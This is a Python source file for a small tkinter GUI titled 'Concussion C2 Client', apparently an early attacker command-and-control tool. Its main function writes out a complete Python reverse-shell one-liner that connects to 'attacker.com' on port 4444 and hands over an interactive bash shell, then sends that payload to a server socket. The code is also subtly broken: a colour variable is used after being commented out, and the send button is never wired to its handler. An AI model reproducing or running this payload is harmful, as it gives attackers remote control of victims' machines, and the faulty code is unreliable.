import tkinter as tk
import socket
import threading

# Define the server's IP address and port
SERVER_IP = '0.0.0.0'
SERVER_PORT = 8081

# Create the main application window
root = tk.Tk()
root.title("Concussion C2 Client")
root.geometry("700x500")  # Adjust the window size as needed
root.configure(bg="#000046")

# Define the common color scheme
#primary_color = "#3498db"
#secondary_color = "#2ecc71"
#background_color = "#000046"
#text_color = "#00C8FF"

root.configure(bg=background_color)

def send_command():
    # Generate a reverse shell payload
    reverse_shell_payload = generate_reverse_shell_payload("attacker.com", 4444)
    
    # Send the payload to the server
    send_payload(reverse_shell_payload)

def generate_reverse_shell_payload(ip, port):
    # Implement logic to generate a reverse shell payload
    payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
    return payload

def send_payload(payload):
    try:
        # Create a socket and establish a connection to the server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Send the payload to the server
        client_socket.send(payload.encode('utf-8'))

        # Receive and process the response from the server (if applicable)
        response_data = client_socket.recv(1024).decode('utf-8')
        print(response_data)

        # Close the client socket
        client_socket.close()
    except Exception as e:
        print(f"Error: {e}")

        # Handle connection or other errors gracefully
        print(f"Server Status: Error - {e}")

# Add Labels and Headings (unchanged)
main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
main_heading.pack(pady=(20, 10))

# Create a label for the server connection status
status_label = tk.Label(root, text="Server Status: Not Connected", font=("Helvetica", 16, "bold"), bg="#000046", fg="#41E67B")
status_label.pack(padx=10, pady=10)

# Enhance Button Styling (unchanged)
send_button = tk.Button(root, text="Send Command",font=("Helvetica", 16, "bold"), bg="#00FFEA", fg="#0000A2")
send_button.pack()

# Run the GUI application
root.mainloop()

